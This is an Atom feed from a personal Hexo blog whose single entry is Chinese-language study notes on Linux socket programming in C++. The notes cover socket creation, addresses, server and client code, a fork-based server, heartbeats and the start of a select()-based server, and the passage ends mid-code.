<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yury&#39;s Blog</title>
  
  
  <link href="https://yury757.github.io/atom.xml" rel="self"/>
  
  <link href="https://yury757.github.io/"/>
  <updated>2022-05-02T13:41:12.650Z</updated>
  <id>https://yury757.github.io/</id>
  
  <author>
    <name>Yury</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>socket入门学习</title>
    <link href="https://yury757.github.io/computer-science/Computer-Networking/socket"/>
    <id>https://yury757.github.io/computer-science/Computer-Networking/socket</id>
    <published>2022-04-14T16:00:00.000Z</published>
    <updated>2022-05-02T13:41:12.650Z</updated>
    
    <content type="html"><![CDATA[<p>本学习笔记基于ubuntu18+cpp14中socket代码，学习socket。</p><p>最权威的文档：man命令。</p><h2 id="1、socket是什么"><a href="#1、socket是什么" class="headerlink" title="1、socket是什么"></a>1、socket是什么</h2><p>socket是一个**<font color="Red">文件描述符（file descriptor）</font>**，可以通过设置DOMAIN、TYPE、PROTOCOL来创建不同类型的socket。</p><p>linux将网络IO抽象为对文件的IO，socket就是网络IO的一个通道或者接口。</p><pre><code class="c++">// &lt;sys/socket.h&gt;/* Create a new socket of type TYPE in domain DOMAIN, using   protocol PROTOCOL.  If PROTOCOL is zero, one is chosen automatically.   Returns a file descriptor for the new socket, or -1 for errors.  */extern int socket (int __domain, int __type, int __protocol) __THROW;</code></pre><h3 id="（1）DOMAIN"><a href="#（1）DOMAIN" class="headerlink" title="（1）DOMAIN"></a>（1）DOMAIN</h3><p>DOMAIN是指地址簇，或者协议簇，表示不同类型的<strong>地址识别方式</strong>。如下所示有这么多种地址簇。</p><p>最常用的就是TCP/IP协议簇，即<code>PF_INET</code>，或<code>AF_INET</code>；以及IPV6协议簇，<code>PF_INET6</code>，或<code>AF_INET6</code>。</p><p>protocol family和address family本质上是同一种分类，只是为了适配不同的系统才形成两类宏名。在linux上我们一般用<code>AF</code>这一套。</p><pre><code class="c++">/* Protocol families.  */#define PF_UNSPEC    0    /* Unspecified.  */#define PF_LOCAL    1    /* Local to host (pipes and file-domain).  */#define PF_UNIX        PF_LOCAL /* POSIX name for PF_LOCAL.  */#define PF_FILE        PF_LOCAL /* Another non-standard name for PF_LOCAL.  */#define PF_INET        2    /* IP protocol family.  */#define PF_AX25        3    /* Amateur Radio AX.25.  */#define PF_IPX        4    /* Novell Internet Protocol.  */#define PF_APPLETALK    5    /* Appletalk DDP.  */#define PF_NETROM    6    /* Amateur radio NetROM.  */#define PF_BRIDGE    7    /* Multiprotocol bridge.  */#define PF_ATMPVC    8    /* ATM PVCs.  */#define PF_X25        9    /* Reserved for X.25 project.  */#define PF_INET6    10    /* IP version 6.  */#define PF_ROSE        11    /* Amateur Radio X.25 PLP.  */#define PF_DECnet    12    /* Reserved for DECnet project.  */#define PF_NETBEUI    13    /* Reserved for 802.2LLC project.  */#define PF_SECURITY    14    /* Security callback pseudo AF.  */#define PF_KEY        15    /* PF_KEY key management API.  */#define PF_NETLINK    16#define PF_ROUTE    PF_NETLINK /* Alias to emulate 4.4BSD.  */#define PF_PACKET    17    /* Packet family.  */#define PF_ASH        18    /* Ash.  */#define PF_ECONET    19    /* Acorn Econet.  */#define PF_ATMSVC    20    /* ATM SVCs.  */#define PF_RDS        21    /* RDS sockets.  */#define PF_SNA        22    /* Linux SNA Project */#define PF_IRDA        23    /* IRDA sockets.  */#define PF_PPPOX    24    /* PPPoX sockets.  */#define PF_WANPIPE    25    /* Wanpipe API sockets.  */#define PF_LLC        26    /* Linux LLC.  */#define PF_IB        27    /* Native InfiniBand address.  */#define PF_MPLS        28    /* MPLS.  */#define PF_CAN        29    /* Controller Area Network.  */#define PF_TIPC        30    /* TIPC sockets.  */#define PF_BLUETOOTH    31    /* Bluetooth sockets.  */#define PF_IUCV        32    /* IUCV sockets.  */#define PF_RXRPC    33    /* RxRPC sockets.  */#define PF_ISDN        34    /* mISDN sockets.  */#define PF_PHONET    35    /* Phonet sockets.  */#define PF_IEEE802154    36    /* IEEE 802.15.4 sockets.  */#define PF_CAIF        37    /* CAIF sockets.  */#define PF_ALG        38    /* Algorithm sockets.  */#define PF_NFC        39    /* NFC sockets.  */#define PF_VSOCK    40    /* vSockets.  */#define PF_KCM        41    /* Kernel Connection Multiplexor.  */#define PF_QIPCRTR    42    /* Qualcomm IPC Router.  */#define PF_SMC        43    /* SMC sockets.  */#define PF_MAX        44    /* For now..  *//* Address families.  */#define AF_UNSPEC    PF_UNSPEC#define AF_LOCAL    PF_LOCAL#define AF_UNIX        PF_UNIX#define AF_FILE        PF_FILE#define AF_INET        PF_INET#define AF_AX25        PF_AX25#define AF_IPX        PF_IPX#define AF_APPLETALK    PF_APPLETALK#define AF_NETROM    PF_NETROM#define AF_BRIDGE    PF_BRIDGE#define AF_ATMPVC    PF_ATMPVC#define AF_X25        PF_X25#define AF_INET6    PF_INET6#define AF_ROSE        PF_ROSE#define AF_DECnet    PF_DECnet#define AF_NETBEUI    PF_NETBEUI#define AF_SECURITY    PF_SECURITY#define AF_KEY        PF_KEY#define AF_NETLINK    PF_NETLINK#define AF_ROUTE    PF_ROUTE#define AF_PACKET    PF_PACKET#define AF_ASH        PF_ASH#define AF_ECONET    PF_ECONET#define AF_ATMSVC    PF_ATMSVC#define AF_RDS        PF_RDS#define AF_SNA        PF_SNA#define AF_IRDA        PF_IRDA#define AF_PPPOX    PF_PPPOX#define AF_WANPIPE    PF_WANPIPE#define AF_LLC        PF_LLC#define AF_IB        PF_IB#define AF_MPLS        PF_MPLS#define AF_CAN        PF_CAN#define AF_TIPC        PF_TIPC#define AF_BLUETOOTH    PF_BLUETOOTH#define AF_IUCV        PF_IUCV#define AF_RXRPC    PF_RXRPC#define AF_ISDN        PF_ISDN#define AF_PHONET    PF_PHONET#define AF_IEEE802154    PF_IEEE802154#define AF_CAIF        PF_CAIF#define AF_ALG        PF_ALG#define AF_NFC        PF_NFC#define AF_VSOCK    PF_VSOCK#define AF_KCM        PF_KCM#define AF_QIPCRTR    PF_QIPCRTR#define AF_SMC        PF_SMC#define AF_MAX        PF_MAX</code></pre><h3 id="（2）TYPE"><a href="#（2）TYPE" class="headerlink" title="（2）TYPE"></a>（2）TYPE</h3><p>TYPE是指socket传输类型，表示不同的<strong>传输层类型</strong>，如下所示。</p><ul><li>SOCK_STREAM，即有序的、可靠的、基于连接的字节流。（TCP）</li><li>SOCK_DGRAM，面向无连接的，不可靠，固定最大长度数据包。（UDP）</li><li>SOCK_RAW，原始socket数据包，需要手动解析数据包格式并作出对应处理。可以理解为TCP/UDP一种封装好了的数据包格式，而RAW则需要自己封装或解析数据包。</li><li>SOCK_PACKET，直接从网络链路层获取数据并处理数据，如MySQL、postgresql数据库连接的各种驱动就是这种网络连接方式。</li></ul><pre><code class="c++">/* Types of sockets.  */enum __socket_type&#123;  SOCK_STREAM = 1,        /* Sequenced, reliable, connection-based                   byte streams.  */#define SOCK_STREAM SOCK_STREAM  SOCK_DGRAM = 2,        /* Connectionless, unreliable datagrams                   of fixed maximum length.  */#define SOCK_DGRAM SOCK_DGRAM  SOCK_RAW = 3,            /* Raw protocol interface.  */#define SOCK_RAW SOCK_RAW  SOCK_RDM = 4,            /* Reliably-delivered messages.  */#define SOCK_RDM SOCK_RDM  SOCK_SEQPACKET = 5,        /* Sequenced, reliable, connection-based,                   datagrams of fixed maximum length.  */#define SOCK_SEQPACKET SOCK_SEQPACKET  SOCK_DCCP = 6,        /* Datagram Congestion Control Protocol.  */#define SOCK_DCCP SOCK_DCCP  SOCK_PACKET = 10,        /* Linux specific way of getting packets                   at the dev level.  For writing rarp and                   other similar things on the user level. */#define SOCK_PACKET SOCK_PACKET  /* Flags to be ORed into the type parameter of socket and socketpair and     used for the flags parameter of paccept.  */  SOCK_CLOEXEC = 02000000,    /* Atomically set close-on-exec flag for the                   new descriptor(s).  */#define SOCK_CLOEXEC SOCK_CLOEXEC  SOCK_NONBLOCK = 00004000    /* Atomically mark descriptor(s) as                   non-blocking.  */#define SOCK_NONBLOCK SOCK_NONBLOCK&#125;;</code></pre><h3 id="（3）PROTOCAL"><a href="#（3）PROTOCAL" class="headerlink" title="（3）PROTOCAL"></a>（3）PROTOCAL</h3><p>PROTOCAL表示最终socket通信协议类型（= 网络层协议 + 传输层协议）。基于IP协议簇包括的协议类型如下。</p><p>如果选择0，用于TCP的虚拟协议，则操作系统会自动根据前两个参数选择一种协议。若自己填，却填错了，则无法创建socket。所以一般填0即可。</p><ul><li>IPPROTO_TCP，网络层使用IP协议，传输层使用TCP协议。</li><li>IPPROTO_TCP，网络层使用IP协议，传输层使用TCP协议。</li></ul><pre><code class="c++">/* Standard well-defined IP protocols.  */enum  &#123;    IPPROTO_IP = 0,       /* Dummy protocol for TCP.  */#define IPPROTO_IP        IPPROTO_IP    IPPROTO_ICMP = 1,       /* Internet Control Message Protocol.  */#define IPPROTO_ICMP        IPPROTO_ICMP    IPPROTO_IGMP = 2,       /* Internet Group Management Protocol. */#define IPPROTO_IGMP        IPPROTO_IGMP    IPPROTO_IPIP = 4,       /* IPIP tunnels (older KA9Q tunnels use 94).  */#define IPPROTO_IPIP        IPPROTO_IPIP    IPPROTO_TCP = 6,       /* Transmission Control Protocol.  */#define IPPROTO_TCP        IPPROTO_TCP    IPPROTO_EGP = 8,       /* Exterior Gateway Protocol.  */#define IPPROTO_EGP        IPPROTO_EGP    IPPROTO_PUP = 12,       /* PUP protocol.  */#define IPPROTO_PUP        IPPROTO_PUP    IPPROTO_UDP = 17,       /* User Datagram Protocol.  */#define IPPROTO_UDP        IPPROTO_UDP    IPPROTO_IDP = 22,       /* XNS IDP protocol.  */#define IPPROTO_IDP        IPPROTO_IDP    IPPROTO_TP = 29,       /* SO Transport Protocol Class 4.  */#define IPPROTO_TP        IPPROTO_TP    IPPROTO_DCCP = 33,       /* Datagram Congestion Control Protocol.  */#define IPPROTO_DCCP        IPPROTO_DCCP    IPPROTO_IPV6 = 41,     /* IPv6 header.  */#define IPPROTO_IPV6        IPPROTO_IPV6    IPPROTO_RSVP = 46,       /* Reservation Protocol.  */#define IPPROTO_RSVP        IPPROTO_RSVP    IPPROTO_GRE = 47,       /* General Routing Encapsulation.  */#define IPPROTO_GRE        IPPROTO_GRE    IPPROTO_ESP = 50,      /* encapsulating security payload.  */#define IPPROTO_ESP        IPPROTO_ESP    IPPROTO_AH = 51,       /* authentication header.  */#define IPPROTO_AH        IPPROTO_AH    IPPROTO_MTP = 92,       /* Multicast Transport Protocol.  */#define IPPROTO_MTP        IPPROTO_MTP    IPPROTO_BEETPH = 94,   /* IP option pseudo header for BEET.  */#define IPPROTO_BEETPH        IPPROTO_BEETPH    IPPROTO_ENCAP = 98,       /* Encapsulation Header.  */#define IPPROTO_ENCAP        IPPROTO_ENCAP    IPPROTO_PIM = 103,       /* Protocol Independent Multicast.  */#define IPPROTO_PIM        IPPROTO_PIM    IPPROTO_COMP = 108,       /* Compression Header Protocol.  */#define IPPROTO_COMP        IPPROTO_COMP    IPPROTO_SCTP = 132,       /* Stream Control Transmission Protocol.  */#define IPPROTO_SCTP        IPPROTO_SCTP    IPPROTO_UDPLITE = 136, /* UDP-Lite protocol.  */#define IPPROTO_UDPLITE        IPPROTO_UDPLITE    IPPROTO_MPLS = 137,    /* MPLS in IP.  */#define IPPROTO_MPLS        IPPROTO_MPLS    IPPROTO_RAW = 255,       /* Raw IP packets.  */#define IPPROTO_RAW        IPPROTO_RAW    IPPROTO_MAX  &#125;;</code></pre><h3 id="（4）创建socket"><a href="#（4）创建socket" class="headerlink" title="（4）创建socket"></a>（4）创建socket</h3><p>若成功创建socket，则返回大于0的数字。创建失败则返回-1。</p><pre><code class="c++">// 基于ipv4的TCP连接int socket1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);cout &lt;&lt; socket1 &lt;&lt; endl;// 基于ipv4的UDP连接int socket2 = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);cout &lt;&lt; socket2 &lt;&lt; endl;// 基于ipv4的原始数据包int socket3 = socket(AF_INET, SOCK_RAW, 0);cout &lt;&lt; socket3 &lt;&lt; endl;</code></pre><h2 id="2、创建socket地址"><a href="#2、创建socket地址" class="headerlink" title="2、创建socket地址"></a>2、创建socket地址</h2><p>以ipv4地址为例。sockaddr_in结构体即为socket地址，三个变量分别为：</p><ul><li>SOCKADDR_COMMON (sin_)，地址簇，即创建socket的第一个参数</li><li>in_port_t sin_port，端口，是一个2字节无符号整数（unsigned short int）。<ul><li>htons方法用于将unsigned short int型主机字节序的端口数字转换成网络传输需要的字节序的端口数字。</li></ul></li><li>struct in_addr sin_addr，具体ip地址，是一个4字节无符号整数（unsigned int）。<ul><li>htonl方法用于将unsigned int型主机字节序的端口数字转换成网络传输需要的字节序的端口数字。</li></ul></li></ul><p>常用地址如下：</p><ul><li>INADDR_LOOPBACK，本机回环地址，127.0.0.0</li><li>INADDR_ANY，接收任意收到的消息，0.0.0.0</li><li>INADDR_BROADCASE，广播地址，发动消息到任意主机，255.255.255.255</li></ul><pre><code class="c++">/* Structure describing an Internet socket address.  */struct sockaddr_in  &#123;    __SOCKADDR_COMMON (sin_);    in_port_t sin_port;            /* Port number.  */    struct in_addr sin_addr;        /* Internet address.  */    /* Pad to size of `struct sockaddr&#39;.  */    unsigned char sin_zero[sizeof (struct sockaddr) -               __SOCKADDR_COMMON_SIZE -               sizeof (in_port_t) -               sizeof (struct in_addr)];  &#125;;/* Internet address.  */typedef uint32_t in_addr_t;struct in_addr  &#123;    in_addr_t s_addr;  &#125;;typedef __uint32_t uint32_t;typedef unsigned int __uint32_t;extern uint32_t htonl (uint32_t __hostlong)     __THROW __attribute__ ((__const__));extern uint16_t htons (uint16_t __hostshort)     __THROW __attribute__ ((__const__));</code></pre><p>创建socket地址：</p><pre><code class="c++">sockaddr_in addr&#123;&#125;;addr.sin_family = AF_INET;short unsigned int port = htons(3000);cout &lt;&lt; &quot;转换前的端口为：&quot; &lt;&lt; 3000 &lt;&lt; &quot;，转换后的端口为：&quot; &lt;&lt; port &lt;&lt; endl;addr.sin_port = port;unsigned long int address = htonl(INADDR_LOOPBACK);cout &lt;&lt; &quot;转换前的地址为：&quot; &lt;&lt; INADDR_LOOPBACK &lt;&lt; &quot;，转换后的地址为：&quot; &lt;&lt; address &lt;&lt; endl;addr.sin_addr.s_addr = address;</code></pre><h2 id="3、setsockopt"><a href="#3、setsockopt" class="headerlink" title="3、setsockopt"></a>3、setsockopt</h2><p>该方法用于设置socket选项，可选调用，也可以不调用该方法，使用默认选项。但通常来说启动其中的“复用端口号”选项可以开启，若不开启该选项，重启server端的socket程序时，会绑定端口错误，说端口正在被使用。</p><pre><code class="c++">/* Set socket FD&#39;s option OPTNAME at protocol level LEVEL   to *OPTVAL (which is OPTLEN bytes long).   Returns 0 on success, -1 for errors.  */extern int setsockopt (int __fd, int __level, int __optname,             const void *__optval, socklen_t __optlen) __THROW;setsockopt(welcome_socket, SOL_SOCKET, SO_REUSEADDR, &amp;enable, sizeof(int));</code></pre><p>socket选项如下：</p><pre><code class="c++">#define SO_DEBUG    1#define SO_REUSEADDR    2#define SO_TYPE        3#define SO_ERROR    4#define SO_DONTROUTE    5#define SO_BROADCAST    6#define SO_SNDBUF    7#define SO_RCVBUF    8#define SO_SNDBUFFORCE    32#define SO_RCVBUFFORCE    33#define SO_KEEPALIVE    9#define SO_OOBINLINE    10#define SO_NO_CHECK    11#define SO_PRIORITY    12#define SO_LINGER    13#define SO_BSDCOMPAT    14#define SO_REUSEPORT    15#ifndef SO_PASSCRED /* powerpc only differs in these */#define SO_PASSCRED    16#define SO_PEERCRED    17#define SO_RCVLOWAT    18#define SO_SNDLOWAT    19#define SO_RCVTIMEO    20  // 接收消息的超时时间#define SO_SNDTIMEO    21  // 发送消息的超时时间</code></pre><h2 id="4、server-socket创建"><a href="#4、server-socket创建" class="headerlink" title="4、server socket创建"></a>4、server socket创建</h2><p>socket表示网络IO的通道，服务器和客户端通信都需要创建socket，服务端接收连接，客户端发起连接。</p><p>创建服务端的socket，有以下步骤：</p><ul><li>创建服务端welcome socket，该socket专门用于接收连接而不会从该socket读取数据。</li><li>创建服务端地址结构体sockaddr_in</li><li>绑定端口并监听</li><li>接收连接，获取connection socket，该socket代表一个连接会话，可以从该socket中读取数据。</li><li>读取字节流，处理，写入输出字节流</li></ul><h3 id="（1）绑定、监听"><a href="#（1）绑定、监听" class="headerlink" title="（1）绑定、监听"></a>（1）绑定、监听</h3><p>将创建的socket绑定到创建的ip地址上。</p><p>其中需要将sockaddr_in强制转换为sockaddr指针再绑定。</p><pre><code class="c++">/* Give the socket FD the local address ADDR (which is LEN bytes long).  */extern int bind (int __fd, __CONST_SOCKADDR_ARG __addr, socklen_t __len)     __THROW;/* Structure describing a generic socket address.  */struct sockaddr  &#123;    __SOCKADDR_COMMON (sa_);    /* Common data: address family and length.  */    char sa_data[14];        /* Address data.  */  &#125;;bind(welcome_socket1, (struct sockaddr *) &amp;addr, sizeof(addr));</code></pre><p>开启对socket的监听，准备接受客户端连接。</p><p>N表示最大队列数，当程序已经接收到一个connection时，若还有其他客户端发起连接，则会进入队列中，当前连接处理结束后会直接从队列中取出下一个连接进行处理。超过该数字的连接将会被抛弃。</p><pre><code class="c++">/* Prepare to accept connections on socket FD.   N connection requests will be queued before further requests are refused.   Returns 0 on success, -1 for errors.  */extern int listen (int __fd, int __n) __THROW;listen(welcome_socket1, 10);</code></pre><h3 id="（2）接收连接"><a href="#（2）接收连接" class="headerlink" title="（2）接收连接"></a>（2）接收连接</h3><p>在已经创建好的服务端socket上阻塞等待客户端连接。</p><ul><li><p>addr指针表示连接对方的地址，可以用INADDR_ANY表示任意地址，或者填如nullptr，也表示任意地址。若指定了某个地址，则只有该地址可以访问。</p></li><li><p>addr_len指针表示addr的sizeof。</p></li></ul><p>当接收到一个客户端连接时，该方法就返回一个整数，代表本次会话的连接socket。</p><p>注意这个连接socket和服务端socket不一样。服务端socket只用于接收新的连接，而连接socket</p><pre><code class="c++">/* Await a connection on socket FD.   When a connection arrives, open a new socket to communicate with it,   set *ADDR (which is *ADDR_LEN bytes long) to the address of the connecting   peer and *ADDR_LEN to the address&#39;s actual length, and return the   new socket&#39;s descriptor, or -1 for errors.   This function is a cancellation point and therefore not marked with   __THROW.  */extern int accept (int __fd, __SOCKADDR_ARG __addr,           socklen_t *__restrict __addr_len);int connection_socket = accept(welcome_socket1, nullptr, nullptr);</code></pre><h3 id="（3）读取返回"><a href="#（3）读取返回" class="headerlink" title="（3）读取返回"></a>（3）读取返回</h3><p>从使用read方法可以从刚才得到的连接socket中读取字节流，可以用一个缓冲区接收该字节流。</p><p>经处理后，再将响应消息通过write方法，写入这个连接socket</p><pre><code class="c++">char buffer[1024] = &#123;0&#125;;read(connection_socket, buffer, sizeof(buffer));printf(&quot;%s\n&quot;, buffer);char* response = &quot;hello world!&quot;;send(connection_socket, response, strlen(response), 0);close(welcome_socket);close(connection_socket);</code></pre><h3 id="（4）服务端完整代码"><a href="#（4）服务端完整代码" class="headerlink" title="（4）服务端完整代码"></a>（4）服务端完整代码</h3><pre><code class="c++">int my_server(int port) &#123;    // TCP连接    int welcome_socket = socket(AF_INET, SOCK_STREAM, 0);    if (welcome_socket &lt; 0) &#123;        cout &lt;&lt; &quot;socket创建失败&quot;;        exit(-1);    &#125;    int enable = 1;    setsockopt(welcome_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEADDR, &amp;enable, sizeof(int));    // 创建地址    struct sockaddr_in addr&#123;&#125;;    addr.sin_family = AF_INET;    addr.sin_port = htons(port);    addr.sin_addr.s_addr = htonl(INADDR_ANY);    int len = sizeof(addr);    // 绑定并并监听    if (bind(welcome_socket, (sockaddr*) &amp;addr, len) &lt; 0) &#123;        cout &lt;&lt; &quot;绑定失败&quot;;        exit(-1);    &#125;    // listen的第二个参数n，表示最大队列数    if (listen(welcome_socket, 10) &lt; 0) &#123;        cout &lt;&lt; &quot;监听失败&quot;;        exit(-1);    &#125;    while (true) &#123;        int conn_socket = accept(welcome_socket, nullptr, nullptr);        if (conn_socket &lt; 0) &#123;            cout &lt;&lt; &quot;客户端连接失败&quot;;            exit(-1);        &#125;        char buffer[1024] = &#123;0&#125;;        read(conn_socket, buffer, sizeof(buffer));        printf(&quot;%s\n&quot;, buffer);        char* response = &quot;OK&quot;;        send(conn_socket, response, strlen(response), 0);        close(conn_socket);    &#125;&#125;</code></pre><h2 id="5、client-socket创建"><a href="#5、client-socket创建" class="headerlink" title="5、client socket创建"></a>5、client socket创建</h2><p>创建client socket和server端的socket差异不大，只是没有welcome socket和client的区分，以及连接服务端的方法不是accept，而是connect。代码如下：</p><pre><code class="c++">int my_client(char* host, int port) &#123;    int client_socket = socket(AF_INET, SOCK_STREAM, 0);    if (client_socket &lt; 0) &#123;        cout &lt;&lt; &quot;客户端socket创建失败！&quot;;        exit(-1);    &#125;    struct sockaddr_in serverAddr&#123;&#125;;    serverAddr.sin_family = AF_INET;    serverAddr.sin_port = htons(port);    int res = inet_pton(AF_INET, host, &amp;serverAddr.sin_addr);    if (res &lt; 0) &#123;        cout &lt;&lt; &quot;解析host失败&quot;;        exit(-1);    &#125;    res = connect(client_socket, (struct sockaddr *) &amp;serverAddr, sizeof(serverAddr));    if (res &lt; 0) &#123;        cout &lt;&lt; &quot;连接服务器失败&quot;;        exit(-1);    &#125;    char buffer[1024] = &#123;0&#125;;    char* message = &quot;hello server, I&#39;m client!&quot;;    int n = send(client_socket, message, strlen(message), 0);    if (n &lt; 0) &#123;        cout &lt;&lt; &quot;消息发送失败&quot; &lt;&lt; endl;    &#125;else &#123;        cout &lt;&lt; &quot;消息已发送&quot; &lt;&lt; endl;    &#125;    read(client_socket, buffer, sizeof(buffer));    printf(&quot;%s&quot;, buffer);    close(client_socket);    return 0;&#125;</code></pre><h2 id="6、fork-server"><a href="#6、fork-server" class="headerlink" title="6、fork server"></a>6、fork server</h2><p>以上说的tcp server只能处理一个连接，无法处理多个请求。想要处理多个请求，第一时间可以想到用多进程或多进线程，可以通过fork一个server进程来实现处理多请求。在以往的unix操作系统中，使用多线程的难度高于使用多进程，因此大多数c++程序员使用多进程而不是多线程来处理多任务。</p><p>代码如下。</p><ul><li><p><code>signal(SIGCHLD, SIG_IGN);</code>，忽略子进程的信号，子进程会交给操作系统内核来回收</p></li><li><p><code>fork()</code>，可以创建一个子进程，子进程使用的资源全部是从父进程复制的来。在子进程中该方法返回0，父进程中返回子进程的pid。</p></li></ul><p>这里不深入讨论fork和signal的细节。</p><p>题外话：postgres、linux上的oracle数据库的连接就是多进程的，而MySQL是多线程。</p><pre><code class="c++">int fork_server(int port) &#123;    signal(SIGCHLD, SIG_IGN); // 忽略子进程的信号，子进程会交给操作系统内核来回收    // TCP连接    int welcome_socket = socket(AF_INET, SOCK_STREAM, 0);    if (welcome_socket &lt; 0) &#123;        cout &lt;&lt; &quot;socket创建失败&quot;;        exit(-1);    &#125;    int enable = 1;    setsockopt(welcome_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEADDR, &amp;enable, sizeof(int));    // 创建地址    struct sockaddr_in addr&#123;&#125;;    addr.sin_family = AF_INET;    addr.sin_port = htons(port);    addr.sin_addr.s_addr = htonl(INADDR_ANY);    int len = sizeof(addr);    // 绑定并并监听    if (bind(welcome_socket, (sockaddr*) &amp;addr, len) &lt; 0) &#123;        cout &lt;&lt; &quot;绑定失败&quot;;        exit(-1);    &#125;    // listen的第二个参数n，表示最大队列数    if (listen(welcome_socket, 10) &lt; 0) &#123;        cout &lt;&lt; &quot;监听失败&quot;;        exit(-1);    &#125;    int count = 0;    while (true) &#123;        int conn_socket = accept(welcome_socket, nullptr, nullptr);        if (conn_socket &lt; 0) &#123;            cout &lt;&lt; &quot;客户端连接失败&quot;;            exit(-1);        &#125;        // 如果该进程是父进程，收到一个connection，只需要fork一个子进程，将连接交给子进程来处理，自己可以回去继续接收连接        if (fork() &gt; 0) &#123;            continue;        &#125;        // 以下是子进程操作        while (true) &#123;            char buffer[1024] = &#123;0&#125;;            int size = read(conn_socket, buffer, sizeof(buffer));            if (size &lt;= 0) &#123;                break;            &#125;            printf(&quot;%s %d\n&quot;, buffer, count++);            char* response = buffer;            send(conn_socket, response, strlen(response), 0);        &#125;        close(conn_socket);        // 子进程需要关闭welcome_socket，并结束进程        close(welcome_socket);        return 0;    &#125;&#125;</code></pre><h2 id="7、心跳"><a href="#7、心跳" class="headerlink" title="7、心跳"></a>7、心跳</h2><p>服务端对于一个已经建立好的连接，经常会设置接收消息的超时时间，即若超过这个时间没有消息到来时，就会断开该连接。</p><p>服务端设置超时时间只需要对connectin socket设置setsockopt即可，如下。</p><p>当服务端加上以下代码时，若客户端连接上后，超过10秒没有发送消息，服务端则会自动断开该连接。</p><pre><code class="c++">// 设置接收报文超时时间struct timeval tv&#123;&#125;;tv.tv_usec = 0;tv.tv_sec = 10;setsockopt(conn_socket, SOL_SOCKET, SO_RCVTIMEO, &amp;tv, sizeof(tv));</code></pre><p>而客户端为了保证一直保持连接状态，就需要定时向服务端发送心跳包。可以简单通过fork一个客户端进程来时间定时发送心跳包。</p><pre><code class="c++">if (fork() == 0) &#123;    // 若为子进程，则无限循环每过5秒发送发送心跳包。    while(true) &#123;        send(client_socket, &quot;0&quot;, 1, 0);        char buffer[1024] = &#123;&#125;;        read(client_socket, buffer, sizeof(buffer));        printf(&quot;%s&quot;, buffer);        sleep(5);    &#125;    return 0;&#125;</code></pre><p>同时服务端也需要对收到的消息进行额外处理。若为心跳包，则不进行业务处理，而是直接返回一个success。</p><pre><code class="c++">// 简单设定心跳报文为一个字符0，则当服务端收到心跳报文，不进行业务处理，只返回可以只返回一个成功消息即可。if (size == 1 &amp;&amp; strcmp(buffer, &quot;0&quot;) == 0) &#123;    cout &lt;&lt; &quot;heart beat!&quot; &lt;&lt; endl;    char* response = &quot;success&quot;;    send(conn_socket, response, strlen(response), 0);    continue;&#125;else if (size &lt;= 0) &#123;    close(conn_socket);    break;&#125;</code></pre><h2 id="8、select"><a href="#8、select" class="headerlink" title="8、select"></a>8、select</h2><h3 id="（1）介绍"><a href="#（1）介绍" class="headerlink" title="（1）介绍"></a>（1）介绍</h3><p>前面说的server socket每次只能处理一个客户端连接，当有多个客户端尝试请求服务器时，会以队列的形式一个一个处理。因此要处理多个客户端的连接，可以使用<strong>select</strong>命令。</p><p>select命令允许监控多个socket，当这些socket都没有事件发生时，select被阻塞，当任意一个socket变为活动状态时就会返回对应socket数字，当select的返回值为-1时，则表示产生异常。</p><p>select命令使用的结构体是<code>fd_set</code>，即socket要放在这个结构体中，才能被监控到。该默认大小是128个字节，结构体底层使用bitmap，128个字节对应1024位，每个位代表一个socket，因此最多可以记录1024个socket情况。</p><pre><code class="c++">/* fd_set for select and pselect.  */typedef struct  &#123;    /* XPG4.2 requires this member name.  Otherwise avoid the name       from the global namespace.  */#ifdef __USE_XOPEN    __fd_mask fds_bits[__FD_SETSIZE / __NFDBITS];# define __FDS_BITS(set) ((set)-&gt;fds_bits)#else    __fd_mask __fds_bits[__FD_SETSIZE / __NFDBITS];# define __FDS_BITS(set) ((set)-&gt;__fds_bits)#endif  &#125; fd_set;</code></pre><p>对<code>fd_set</code>数据结构的操作方法如下：</p><pre><code class="c++">fd_set read_fd;// 清空fd_setFD_ZERO(&amp;read_fd);  // 往fd_set中新增一个文件描述符，即将bitmap对应位置的值设置为1FD_SET(master_sock, &amp;read_fd);   // 从fd_set中移除一个文件描述符，即将bitmap对应位置的值设置为0FD_CLR(master_sock, &amp;read_fd); // 如果一个文件描述符中发生了一些事件，则返回1，否则返回0。该事件可以是新连接、可读事件、可写事件等等。FD_ISSET(master_sock, &amp;readfds); </code></pre><p>select函数如下：</p><ul><li>返回值 &gt; 1，即活跃的socket</li><li>返回值 = 0，超时</li><li>返回值 = -1，出现异常</li></ul><pre><code class="c++">/* Check the first NFDS descriptors each in READFDS (if not NULL) for read   readiness, in WRITEFDS (if not NULL) for write readiness, and in EXCEPTFDS   (if not NULL) for exceptional conditions.  If TIMEOUT is not NULL, time out   after waiting the interval specified therein.  Returns the number of ready   descriptors, or -1 for errors.   This function is a cancellation point and therefore not marked with   __THROW.  */extern int select (int __nfds, fd_set *__restrict __readfds,           fd_set *__restrict __writefds,           fd_set *__restrict __exceptfds,           struct timeval *__restrict __timeout);</code></pre><h3 id="（2）流程"><a href="#（2）流程" class="headerlink" title="（2）流程"></a>（2）流程</h3><p>使用select常用轮询的方式：</p><p>1、先创建一个welcome_socket准备接收连接，创建一个数组<code>int client_socket[30]</code>用于存放收到的socket。</p><p>2、清空fd_set，将welcome_socket放入fd_set中监控，将client_socket中已有的连接放入fd_set中进行监控</p><p>3、先判断welcome是否有活动。若有活动，则创建新连接，并加入到client_socket数组中。</p><p>4、再循环client_socket依次判断这里面的所有socket是否有活动。若有活动则进行IO读写。若发现已经断开连接，则从client_socket中移除。</p><p>5、重复步骤2。</p><h3 id="（3）完整实现"><a href="#（3）完整实现" class="headerlink" title="（3）完整实现"></a>（3）完整实现</h3><pre><code class="c++">int select_server(int port) &#123;    int opt = true;    int welcome_socket , addrlen , new_socket , client_socket[30] ,            max_clients = 30 , activity, i , valread , sd;    int max_sd, count = 0;    struct sockaddr_in address &#123; &#125;;    char buffer[1025];  //data buffer of 1K    //set of socket descriptors    fd_set readfds;    //a message    char *message = &quot;ECHO Daemon v1.0 \r\n&quot;;    //initialise all client_socket[] to 0 so not checked    for (i = 0; i &lt; max_clients; i++)    &#123;        client_socket[i] = 0;    &#125;    //create a master socket    if( (welcome_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0)    &#123;        perror(&quot;socket 